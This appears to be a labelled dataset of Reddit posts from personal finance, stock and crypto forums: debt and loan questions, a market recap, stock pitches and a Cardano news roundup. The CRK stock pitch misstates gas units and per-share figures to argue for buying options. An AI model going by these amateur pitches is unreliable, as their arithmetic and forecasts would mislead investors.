At this point, as far as the car itself goes, I’m disinclined to spend more than about $700 on repairs - if my brother wants to spend more than that, he’s certainly welcome to, but I’ve already put $4K in repairs alone into the car. I’m pretty much stumped on what to do here, but so far the only things I can think of are to attempt to refinance the car and get a lower interest rate, so at least I’m not paying $1K a year in interest alone and may be able to pay off the loan faster. Other than that, I could drop my car insurance to non-drivers insurance for now, since it won’t be moving until/unless its fixed(my job is still closed, so I’ve been barely driving anyways, and intend to get my motorcycle license and to primarily ride my bike as a daily driver). The knowledge that I have gap insurance just sitting there is frustrating, but I’m not about to pull an Always Sunny move and drive into a wall just to total the car haha.

Any information or advice would be appreciated. Even if all you can recommend is a search string that might help me find better answers, that would help. I’ve had constant problems with this car, and quite frankly it’s been unmoving for at least half of the entire time I’ve had it. I’m at the end of my rope and just trying to minimize the losses I’ll have to take here.",finance

stocks,"Here is a Market Recap for today Thursday, April 15, 2021","**PsychoMarket Recap - Thursday, April 15, 2021**

Stocks jumped on Thursday, with all three major indexes reaching fresh intraday records as market participants digested a much better-than-expected unemployment report and a sharp increase in consumer spending. The S&amp;P 500 is up roughly 5% in the month of April, led primarily by mega-cap technology and financial stocks. 

Today, the economic data released was very promising. According to a report by the US Department of Commerce, retail sales boomed 9.8% higher in the month of March as the economy continues to gradually reopen as more vaccines are distributed. Moreover, the Weekly Unemployment report showed first-time unemployment claims plunged far below analyst estimates. The Labor Department reported 576,000 new jobless claims for the week ending April 10. This represents the lowest total first-time unemployment claims filed since August 2020 and a sharp decline from both the previous week’s total of 769,000 and analyst expectations of 710,000. 

This is great news on two fronts. First, consumer spending represents 70% of US GDP ([more info here](https://www.thebalance.com/components-of-gdp-explanation-formula-and-chart-3306015#:~:text=Consumer%20spending%20comprises%2070%25%20of,components%20of%20the%20U.S.%20economy.)) and is a key driver of economic growth. GDP is now expected to increase 6.5% in 2021 according to the Federal Open Market Committee, the central bank's monetary policy-making group. That is sharply higher than the 4.2% forecast made in December of 2020. Second, Jerome Powell and other FOMC members have reiterated that recovery in the labor market “remains uneven and far from complete”. To see a report blow so far past analyst expectation is a great sign the labor market is recovering in tandem with the surge in consumer spending. 

Michael Pearce, senior US economist for Capital Economics said of the consumer report, “What caught our eye was the 13.4% surge in spending on food and drink services, while clothing store sales were up by 18.1%. Relative to pre-pandemic levels, food and drink services sales are down just 5.1%, while clothing store sales are now higher than they were in February 2020. That suggests a combination of loosening restrictions and easing of virus fears linked to the vaccine rollout are driving a rapid return to normalcy.” 

Distribution of the Johnson and Johnson (JNJ) coronavirus vaccine remains paused in the US following reports of rare blood clots in people who received the vaccine. The agencies are reviewing data over six reported U.S. cases of a severe blood clot in individuals after receiving the vaccine, and have recommended the pause ""out of an abundance of caution,"" the FDA said in a Twitter post. To date, roughly 6.8 million doses of the single-dose JNJ vaccine have been administered. 

In a statement, JNJ said it has been “working closely with medical experts and health authorities, and we strongly support the open communication of this information to healthcare professionals and the public” and added “In addition, we have been reviewing these cases with European health authorities. We have made the decision to proactively delay the rollout of our vaccine in Europe.” During a press briefing, Dr. Anthony Fauci, director of the National Institute of Allergy and Infectious Diseases, said the J&amp;J vaccine review would likely take “days to weeks, rather than weeks to months”, in order to resolve.” Despite the setback with JNJ, distribution of the vaccine remains strong in the US, with the CDC reporting more than 3 million doses being distributed per day.

personalfinance,[HELP] Which credit card debt should I pay off first?,"Hi r/PersonalFinance,

 

I’m reaching out because I’ve gotten into a bad spot financially and hoping you can help. I was approved for a personal loan of 17k at an interest rate of 10% (monthly payment of $300) which I am hoping to use to help me pay down credit card debt and also help with expenses that have cropped up as a direct result of COVID (wife left me, let go from job, behind on rent). I am now fully employed and looking to take on a second job on weekends to boost my overall income.

 

My first credit card debt is about $5200 AMEX at an APR of 5.9% with a minimum payment of $94. I entered in the hardship program with AMEX and starting next month I will continue at this APR for another year.

 

My second credit card debt is about $11000 with Discover at an APR of 24% with a minimum payment of about $260. Unfortunately, Discover could not offer me any relief at this time.

 

My objective would be to use a small portion of that 17k (perhaps 3-4k) to give myself some breathing room as far as rent or unexpected costs.

 

What credit card should I pay down first? I am having trouble figuring how to divvy up the 17k in smartest way possible. Thank you!",finance

personalfinance,"Should I take a free Masters Degree, or go into the workforce and start paying off my exceptional student debt?","I'm graduating next month with a Bachelor of Science in Computer Science and Engineering, and a minor in Statistics.

&amp;#x200B;

I received no grants or scholarships through FAFSA, and my family could not afford to pay for college, so I got through university primarily with a mix of Federal Subsidized, Federal Unsubsidized, and private loans.

&amp;#x200B;

I currently have an outstanding principal balance of $29,000 on my Federal loans, which I believe are between 2 and 4% interest but I'm not positive.

I currently have $66,000 or so in private loans, with interest rates ranging from as terrible as 12%(I had no credit when I started, and my cosigners weren't much better) to 5% (My credit got quite a bit better as University went on, and I found a cosigner with a large credit history). The majority of them are between 10% and 7%. The oldest of these loans is 3.5 years old at 12% for $8,000, but I made a $3500 payment on it a couple of years ago to try and cancel out the interest growth while I was in school.

&amp;#x200B;

My monthly payment was calculated to be around $1200, but I intend to pay between $1500 and $2000 a month to target that 12% and a few of the 10% loans. I live in the California Bay Area and in my area a one-bedroom apartment can be as low as $1600. Entry-level positions in my field are usually between $60,000 and $80,000 a year in that region. My credit is decent, so there is a solid chance that I can refinance the loans to a much lower interest rate, but that may change when my deferment period is up and the accounts are marked as active. I've been talking to several recruiters and keeping my options open, and I am reasonably certain that I can find a job before I need to begin paying next January.

&amp;#x200B;

The wrench that was thrown into all of this, however, is that the professor that I work for is in need of a research assistant with US residency. He has offered to pay for me to get my Masters of Science in Cybersecurity if I work on a thesis topic that he assigns me. This would also come with a monthly living stipend of around $1900. I go to school in Reno, Nevada, and have several roommates up here, making my rent around $500 a month and so that is more than a livable amount for me. I checked with my loan servicers for both the federal and private loans, and I can defer my loans for two more years. During this period, however, interest would continue to accrue. The pay scale in cybersecurity can go significantly higher than software engineering, though I'm not sure on the exact figures. I would not be able to begin paying down my loans during this period on that $1900 a month stipend without taking on several other forms of income, which would be difficult considering the time commitment of the research position.

&amp;#x200B;

What is the smarter long-term decision, here? Take my Bachelors and start throwing as much money at those loans as I can NOW, or defer them to receive the free Masters degree that I am reasonably certain I am capable of completing?",finance
stocks,LL Flooring a Potential Multi-Bagger and Here's Why (X Post ValueInvesting),"LL Flooring ticker symbol LL

It's hard to find a multi-bagger stock in the days of high valuations. Especially when inflation has traditionally been linked to lower P/E in the stock market’s history. Three important features for a multi-bagger is a stock that has good growth potential, a low P/E, and good leadership. I believe that LL has all of those qualities. A few years back the company was entangled in two lawsuits. One involving formaldehyde at higher than acceptable levels and another for not sourcing their lumber in accordance with law. As a consequence, the cash flows were heavily decreased, and investor sentiment was massively damaged. Consequently, the current P/E is sitting at about 12. I will address in greater detail each of these three drivers now.

**Leadership:**

Right after the legal entanglements, the CEO of the company was fired and the company hired CEO Charles Tyson. Charles Tyson has worked with a lot of supply chains including Advance Autoparts, OfficMax, and Officedepot. Since taking the position, he has focused on rebranding the company and increasing online sales and is trying to increase their market sales to pros.

**P/E:**

Interestingly, although cash flows took a hit in 2019 and 2018 due to legal battles and therefore the earnings decreased, the revenue stayed consistent. In 2019, their free cash flow was -20M and in 2020 it was 141M! I view their legal troubles as a chapter that has passed in the company’s history, but still has damaged their P/E as compared to their historical valuations. For example, FND, the closest market competitor, has a P/E of 57!

**Growth:**

As everyone is aware, 2021 is going to be a blow out year for housing. Jerome Powell has repeatedly stated that interest rates will be kept low throughout the year, the Biden administration is looking for more infrastructure spending, and housing costs are all strong tailwinds for new housing starts. Moreover, one of the most common things people want done in a newly purchased home is the flooring redone. Lastly, hard flooring is expected to grow as carpeting shrinks as total market share. This company’s gross profit has grown for several years in a row, and it would be almost inconceivable that it won’t grow in 2021 and onward.

Additionally, LL has increased their digital presence with the release of a new app that allows people to virtually install flooring in their home by taking a picture of their current floors. I would recommend anyone to try the app out for free. It works incredibly well! I see these as great headwinds for growth of the company.

I can’t help but feel incredibly confident in earnings of the company this year, even in the short term. Year over year earnings will be incredible. Q1 of 2020 was a terrible quarter. Historically they have always outperformed in Q1 vs the prior year’s Q4, but Q1 2020 was the shutdown quarter. As all indicators point to an incredible quarter, Q1 2021 will displace last year’s Q1 and dramatically shift the P/E even lower. Naturally, I see this as an even more enticing scenario as more people will want to buy the stock.

For full disclosure, I love the stock, I own the stock, I will continue to invest in the stock, and I am not a financial advisor and you shouldn’t think I am providing financial advice. I'm looking forward to anyone's comments on the company.",finance

Go to hour 9 minute 30 for his spiel as all the information is pulled from his testimony. Ticker is CRK .

Source: [https://tlcsenate.granicus.com/MediaPlayer.php?view\_id=49&amp;clip\_id=15395](https://tlcsenate.granicus.com/MediaPlayer.php?view_id=49&amp;clip_id=15395)

Facts:

500 Million Cubic Feet of Natty Gas a day for five days at $55 on average spot during the storm.

500MMcF = 500,000 BTU.

500,000 BTU \*55 \* 5 = $137,500,000 in revenue in five days.

The 500MCF amount checks out as that's about a third of their daily production which is what would be available to take advantage of the spot prices as about 60-66% of their production is contracted out at a given time.

Giving their working interest is about 82%... the well royalties would be about 18% so they should get 82% of 137.5M or 112.75M. Now the cost of getting the gas to Texas during the storm were higher but I am willing to say they were not more than 1M a day... so thinking they walked away with about 107.75M in 5 days. Given they would have normally sold at around $3 per BTU at the time the extra NI is likely at least 107.75M - (500,000 \*3\*5) = 100.25M.

Now the company has already started to leverage the storm windfall to refinance its debt at a cheaper interest rate and at a longer maturity and the extra cash inflow from this quarter will serve to strengthen their position. Their slide deck says savings of 45M in interest expense already. Bankers already started giving them cheaper debt immediately after the storm. So its likely the company will only continue to cut down its interest expense with this additional cash flow... which further supports the share price.

Fully Diluted Share Count \~215,000,000 so 45M in savings in annual interest they already have disclosed = further 21 cents per share in earnings (just from less interest on same amount of debt aka refinancing).

Street still has earnings at 12 cents per share for Q1 2021. They are asleep at the wheel and likely never sat through 9.5 hours of senate hearings on the 26th of February. Thinking the real numbers, all else equal, will be north of 50 cents for Q1 2021 alone. This is high for a company that is only trading at $5.00 a share. If it gets 50 cents Q1 and what the street lazily thinks of 15 cents on average for the next three quarters... 2021 is going to end up with 95 cents per share... on a $5 share price if we add the locked in interest savings that is 1.16 cents per share. This gives the company an estimated P/E of 4.3x... This is multibagger territory and the company already has most of its production hedged over 2.50 so the risk of shortfall in Q2/Q3/Q4 is mitigated if Nat Gas revisits the covid panic.

Going to buy options around Q1 earnings date (May 4th, 2021). May the Fourth be with us research monkeys! :)",finance
personalfinance,Using federal student loans to pay higher interest loans?,"Howdy, I am graduate student graduating this summer with a full tuition waiver, but from undergrad, I possess about 105k in loans split 65:35 private/federal. I’m not really worried about those (have solid budget, income, and plan), but I think I may have a decent idea on how to expedite that process a bit, but I am looking for someone to explain why I am an idiot...

So my high interest debts are a car with about $4500 at 13% (was a broke college student who’s car died and had to take anything), and a private student loan for $22,000 at 9.6%.

For the summer semester, I can take up to $10,000 in federal loans. At the worst case scenario, the interest rate for that loan will be less than the rates on the car/private loan, and the best case scenario, it is forgiven as a part of student loan forgiveness by President Biden.

stocks,What bond yields tell us about the state of the economy.,"\[**Disclaimer:** I'm new to this but do have a small background in economics.  I posted this as a comment to another user in the daily thread, but since I put some effort into it and think it's a valuable write-up, I decided to make a thread.  If anything is off, please go ahead and correct me.  I do believe that the bulk of what I'm saying is accurate.\]

&amp;#x200B;

My understanding is that rates (bond yields) go up when the economy is in good shape. That's because people are more confident in equities and they sell off bonds (less demand = lower prices = higher yields).

When the economy is in bad shape, people go back to bonds because they're a safer alternative to stocks. People don't trust in the stock market's ability to perform and flock to bonds to give them fixed income and a safer place to park their capital. More demand for bonds = higher bond prices = lower yields.

Short answer for why bond yields and prices are inversely correlated: say you have a bond that's worth $1000 face value and has a 2% yield.  If demand for bonds has gone down and you must now sell that bond on the secondary market for, say, $800, then the yield has increased.  Why?  Because the buyer is paying less money for the same fixed return.  Less money for the same fixed return = higher overall yield.  And vice versa.  I encourage everyone to look this up if you're not clear on it.

Apart from that, right now is a weird time. Bond rates went up recently, and people were saying that was a *bad* sign for the markets. That's because people were saying it was related to inflation. Imagine: if inflation is going up, bonds with their current 1-2% yields (and negative real yields) are a horrible place to park your cash. You're actually losing money already due to negative real yields, but if inflation spikes 1-3% you're actually losing even more. Remember, bond yields are fixed so inflation eats into their nominal (fixed) yields.

The theory was that economic stimulus plus dovish Fed policy (low interest rates, easy money) made people fearful that inflation was just around the corner. Thus, they began to sell off their bonds. Remember, less demand for bonds = lower prices = higher yields. If this were indeed the motivation for the bond sell-off, it's actually a *negative* indicator for the economy. It means we expect inflation to come. It means the Fed will be forced to raise interest rates to contain inflation (more expensive to borrow money). It means that future earnings will be worth less (value of dollars in the future goes down). This is why tech stocks sank at the same time bond yields went up: A. because they depend on easy capital (low interest rates) to expand their operations, and B. their valuation at the moment is highly linked to their future earnings.

However, Jay Powell and the Fed came out and said any inflation would just be transitory, and the market seemed to believe it. The bond sell-off was contained. Furthermore, analysts were saying, like I said in the first half of my post, that rising bond yields is actually positive for the economy.

So basically the fears about inflation got buried and we're back to a ""normal"" scenario where rising bond yields are seen as a positive sign for the markets.

I'm not sure why bond yields went down today, but a quick Google search said that higher yields have attracted some investors (including overseas investors) back in.

I'm new to this but it was good for me to make sure I understand it and try to explain it. Anyone who reads this can feel free to correct anything that is wrong.",finance

personalfinance,Top 5 credit cards for beginners,"This is probably going to be part 1 of 3 talking about the best credit cards(to my knowledge) for each credit score, as well as the pros and cons of each card. This part will be about those just starting to build or repair their credit. These are all also secured cards, meaning you will have to put anywhere from $100-$500 as a security deposit to establish a line of credit. It’s annoying, but you need to build up trust with the banks in order to get an unsecured line of credit. Just how it goes when you’re starting off.

Also just a little disclaimer beforehand, these aren’t in any particular order. They’re just the best cards to my knowledge.

#Capital One Secured Credit Card

This is a good starter credit card because it has **no annual fee**. I don’t think I need to explain why this is nice. Annual fees are a no no. At least, when you’re just starting to build/repair credit. But we’ll get into that in part 2 and mainly part 3. Another nice perk that I found notable is that if you make your payments on time for 6 months, you’ll automatically be **considered for a credit limit increase**. Increasing your credit limit is a double edged sword. An increase in available credit is good if you know how to control your expenses, but equally as bad if you need that new iPhone and that nicer car. The only con I could find that is actually worth considering, is the fact that it **has a $300 credit limit**. While this kind of negates what I just said about credit limit increases being a double edged sword, it’s still definitely worth noting as you continue building your credit.

#Discover it Secured Card

This one is probably one of my favorites, and for good reason. Like the Capital One card, the Discover it Card has **no annual fee**, but *unlike* the Capital one Card, Discover also has **2% cash back at gas stations, as well as 1% cash back on all other purchases**. Think about how many times you go get food, gas, alcohol, cigarettes, car repairs, etc. why would you not take the opportunity to get 1-2% cash back? But the perks don’t stop there. Discover will also **match your rewards for the first year with NO limits**. It’s free money. Enough said.

#Citi Secured MasterCard

This one is another quality card, though I’m still more of a fan of the Discover card if I’m being honest. This one has **no annual fee** as well. See a pattern? God I hope so. This one is especially good for those who may have made some mistakes, and are looking to repair and rebuild their credit. Or anyone who literally has no credit history. It’s pretty basic, but it gets the job done, and it **has no prior credit requirement**. 

#Navy Federal Secured Card

Again, **no annual fee* for this credit card. But like the Discover card, the Navy Federal card gives **1 point back for every $1 spent**. So essentially 1% cash back, but still a nice reward just for spending money you’d already be spending.

#Bank of America Cash Rewards 

This credit card is one of my favorites. **No annual fee, 3% cash back on your choice of multiple topics included but not limited to food, gas, travel, home repairs.** But the rewards don’t stop there. You will also earn **2% back at grocery stores, and 1% cash back on all other purchases**. This is the first credit card I got, and remains my credit card to this day.

There are obviously many other quality credit cards out there, but these are my personal choices for what I would apply for if I was working to build my credit. Hope this helps",finance

personalfinance,Would it be a bad idea to back out to select a better refinancing offer during underwriting?,"I recently looked at several different companies for a refinance(both online and local).  I received offers and Company A was able to match the interest rate of another with \~$500 less on closing costs.  I just received a message that my loan was submitted to underwriting today.  I received an updated loan estimate worksheet from a Company B with a lower interest rate and much lower closing costs.

Would Company A try to match the other offer despite just submitting to underwriting?  Or would it be a better idea to stop and choose Company B.  I'm currently looking at a 3% rate with $2683 in closing costs(Company A) vs 2.875% with $1786 in closing costs(Company B).",finance

personalfinance,Made too much money and spent way more,"I was a reckless spender, and the more money I made somehow I got into more debt. Was not a good money manager, and would say only slightly better now. I set a monthly budget and have shaved off about 15k of the debt this year.

Situation: Want to buy a house this year, credit in the low 600's due to credit card utilization. Was never good at handling money, made a good living in my early 20's, spent way too much on credit cards. Now trying to juggle saving for a down payment while paying down the CC debt.

Have 9 credit cards. Been aggressively paying down 7 of them that had the highest interest, paid off 6 with these last three remaining.

I make about $12,000 per month before taxes, with take home being roughly $7500

I spend about $4,000 per month between rent/life. Which leaves me with about $3500 per month, I have been putting $1,000 towards saving for the house and $2,500 towards the debt.

Card 1: $17,683 balance 13.99 APR

Card 2: $11,639 balance 17.99 APR

Update Paid Off Card 3: $ 0balance 22.99 APR(will payoff by end of month)

Minimum payment on these 2 combined: $550

I took the pay off the highest interest rates first approach. Am I able to call Navy Fed to negotiate the APR on these cards? What are my best courses of action that you would recommend?

Need help figuring out what's the best/quickest solution on tackling this last $30k of debt.

Do I go for a personal loan? Attack card 2 or card 1? Curious to hear your thoughts on it.

Current CC utilization is at 74% which is the debt above.",finance

personalfinance,Looking to refund my CalPERS account,"So, I had worked for a company for nearly 11 years. Everything was great for the first 10 years up until my position (and all of the same of it's kind) came to a close due to budgeting. The same company ended up creating 8 new positions that payed a bit more. I was lucky to get one and I thought it was going great until about a month ago, the company I worked for called me in and said they were terminating me from my position. They gave no reason, no explanation, nothing. I was (still am to the end of the month) in a workers union and this type of action goes against the work/union agreement. The union is saying they're fighting for me but it honestly is taking forever and getting nowhere.

&amp;#x200B;

It's been just over a month and I've found a new job that seems really cool. They have so much to offer. There is a super nice kitchen with amenities, an full blown arcade, a complete gym and they cover 100% medical and 75% dental/vision. It's super cool! Only problem is, it's paying about $8 less an hour which for me, is a big hit. But they do offer extra shifts and cover the things I was previously paying into so I almost even out.

&amp;#x200B;

Here's where I am at with my CalPERS account situation... I have a family of my own and am looking to buy a home in the near future. Me and my fiance have saved enough money for a decent down payment and closing costs. We have also eliminated most of our debt. But I am considering on refunding my CalPERS account to finish paying off my car and a consolidated debt loan. After paying both of those off, we will be 100% debt free. Paying those off will also leave a nice chunk to add to savings. I'm looking at it like this, I'm 29 years old. I wouldn't touch this money for at least 26 years without being penalized. And I wouldn't be blowing it on nothing, it would be put to good use.

&amp;#x200B;

What I am wondering is, what are the cons to refunding my CalPERS?

Here is what I do know:

* Pulling the funds will result in a 20% federal fee
* I can leave the money in my CalPERS account and keep earning interest

Is there anything else that I don't know?

&amp;#x200B;

I just want to be liberated of debt and move forward in life.

CryptoCurrency,How can Abra offer 10% yield on stable coins?,"I'm looking at a service like Abra earn and wondering how by storing USDC or USDT I can earn a 10% annual yield whereas I struggle to get 1% through a commercial bank.

How is that business model sustainable for Abra (whereas commercial banks tend to offer a marginally worse interest rate than they get from the central bank)?  Are Abra just offering these rates to attract new customers and taking a short term loss?  Or are they using the funds to invest in other vehicles (and speculating they'll make more than 10% themselves)?  I want to try one of these services but there simply must be some additional risk associated with this 10x interest rate.  E.g. if Bitcoin crashes 40% they'd presumably have to lower the rates they're offering?  

Another way to put this: why the hell would anyone take a 0.5% interest rate from their local bank when they can make 10% in Abra?  What's the catch?!",cryptocurrency
personalfinance,27yo with high student loan debt - how best to repay?,"Hi everyone,

I’m 27 years old with approximately $170k in student loans. I just recently finished grad school and will be starting a new job that pays roughly $200k/year (I make a specific production percentage, so this will vary a little). I’ve used extra money I’ve made in the past year to eliminate all of my other debt (paid off about $10k in credit cards in a little over 18 months). In addition to my salary above, I’ve also received a $20k signing bonus and approximately $3-5k in additional yearly credit for continuing education costs since I’m in the medical field.

I anticipate having roughly $7-10k in savings before starting my job and will likely be paying roughly $2k/month for all living expenses in the city I’m heading to (SLC). I’ll be looking to max out my Roth IRA and 401k yearly.

Given the current news about Biden investigating student loan forgiveness and with no interest accruing through September, how should I best go about paying this off? Assuming I pay roughly $30k per year in living expenses (this is rounded up a bit from what I mentioned above), as well as assuming I take home approximately $130k after retirement contributions, should I be looking to pay this off as quickly as possible in a year or two? My concern is the interest rate is only about 5.5%, so I’m worried I should be focusing on allocating a fair portion to the stock market instead given an anticipated 7% year return. 

Having a “real” job and making “real” money is quite a foreign concept to me at this stage in my life, so I just want to make sure I’m doing what’s best. Any and all help is greatly appreciated!",finance

Previously Covered but still interesting:

1. Charles posts a pic of a taxidermy African bird called a Turacos. He follows up that post by saying ""Guys sometimes a stuffed Ethiopian exotic bird next to an old identity book is just a stuffed Ethiopian exotic bird next to an old identity book. Stop reading into things"". Everyone enjoys speculating what exactly this could mean with the obvious implication being that the African bird announcement involves digital identity in Ethiopia. [https://twitter.com/IOHK\_Charles/status/1369397063583227911](https://twitter.com/IOHK_Charles/status/1369397063583227911) [https://twitter.com/IOHK\_Charles/status/1369402020067766275](https://twitter.com/IOHK_Charles/status/1369402020067766275)
2. It's announced that 591 different assets have been minted on Cardano in the last eight days. [https://twitter.com/IOHK\_Charles/status/1369347294324162561](https://twitter.com/IOHK_Charles/status/1369347294324162561)
3. Catalyst Fund 3 Voting is ongoing, it looks like the Yoroi team has worked out the voting problem in the Yoroi wallet. [https://twitter.com/YoroiWallet/status/1369050858546200585](https://twitter.com/YoroiWallet/status/1369050858546200585)
4. Charles says they are actually going to hire investigators for the IOG anti-scammer team. People with a law enforcement or intelligence background should feel free to apply. Should have a report on the team’s first investigation soon. Hopefully, this will contribute to scammers actually actively avoiding (those alliterations tho!) Cardano. Could also be a nice basis for an intelligence apparatus and private military when we build the Cardano Citadel. I mean somebody is gonna have to man the watchtowers if we’re gonna keep out all the no-coiners and ETH people. Kidding...kidding. [https://youtu.be/6God9Xtzuqs](https://youtu.be/6God9Xtzuqs)
5. Cardano hodler Ben Askren continues preparations for his boxing match with Jake Paul. Being a Cardano hodler, it is already a foregone conclusion that Askren’s aura will cause Jake Paul to refuse to fight before the opening bell even sounds. [https://twitter.com/Benaskren/status/1286094545973846017](https://twitter.com/Benaskren/status/1286094545973846017) [https://twitter.com/Benaskren/status/1376021472993480705](https://twitter.com/Benaskren/status/1376021472993480705)

9. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul. It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline. Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors. [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
28. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development. [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
29. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
30. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia. This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega. Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon. Ourobouros Praos was 2017 and it’s still running now. Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server. Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year. It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot. They could also add Hyperledger related permissioned sidechains with this.
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way. Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level. There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)

personalfinance,Why is AMEX offering the same interest rate for a small personal loan despite different installments?,"I'm considering taking a small personal loan from AMEX. What's odd is that they offer three options for structuring repayment (12 months, 24 months, or 36 months), but all have the same interest rate. I plan on paying it back in four or five months. Why would anyone pick the 12-month option if 36 months allows for more flexibility? (There's no pre-payment penalty.)

What am I missing? Is this adjacent to the decoy effect, where they hope I pick the 36-month option,  end up lacking the resolve to aggressively pay it down in six months, and just make the minimum payment?",finance
ethereum,Private Charter (ENS-PCT),"It’s no wonder the attraction my cheap dad had for Ethereum when I explained to him what *fat protocol theory* is. For those that don’t know, it’s this: 

The internet is a protocol. *Value* moves from the protocol layer to its application layer. Google, Amazon, etcetera, are its applications. They’ve become very valuable over the years and quite frankly, show no signs of contracting. In cryptocurrency however, value flows in the opposite direction. It flows from the application layer, to the protocol. Thus the name: *fat protocol thesis.* It’s easy to imagine then, why Ethereum is positioned better than any other cryptocurrency because of what’s built on it. And I’ll posit, that if gas fees fall and staking becomes available to the masses (2.0), it’s likely to make burnt toast of every crypto not ERC related (excluding stablecoins, bitcoin, and privacy coins), unless those protocols velvet fork into the Ethereum protocol. 

It’s no wonder he crossed his arms, spit on the ground, and calmly said: “Tell me more.”

